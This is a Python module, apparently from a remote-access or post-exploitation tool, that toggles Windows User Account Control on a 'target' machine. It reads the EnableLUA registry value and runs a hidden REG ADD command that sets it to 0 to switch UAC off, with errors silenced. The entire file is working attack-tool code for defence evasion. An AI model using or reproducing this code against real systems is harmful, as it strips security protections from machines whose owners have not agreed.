from setting import *

def uac(switch):
    if os_type == "windows":
        try:
            import _winreg
            DEVNULL = open(os.devnull, 'wb')

            # check UAC status
            uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
            val=_winreg.QueryValueEx(uac_key, "EnableLUA")
            if val[0] == 1:
                uac_stat = True # UAC is enabled
            else:
                uac_stat = False # UAC is disabled

            # check the switch command (on/off)
            if switch == "on":
                if uac_stat:
                    return "\n\033[1;32;33m[!]\x1b[0m UAC is already enabled \033[1;32;33m[!]\x1b[0m\n"
                else:
                    try:
                        cmd = "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f"
                        subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)
                        return "\n\033[1;32;32m[+]\x1b[0m UAC enabled \033[1;32;32m[+]\x1b[0m\n"
                    except:
                        pass

            if switch == "off":
                if not uac_stat:
                    return "\n\033[1;32;33m[!]\x1b[0m UAC is already disabled \033[1;32;33m[!]\x1b[0m\n"
                else:
                    try:
                        cmd = "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
                        subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)
                        return "\n\033[1;32;32m[+]\x1b[0m UAC disabled \033[1;32;32m[+]\x1b[0m\n"
                    except:
                        pass

        except:
            return "\033[1;32;31m[-]\x1b[0m Error occurred while switching UAC \033[1;32;31m[-]\x1b[0m"
    else:
        return "\n\033[1;32;33m[!]\x1b[0m target is not a windows machine \033[1;32;33m[!]\n\x1b[0m"
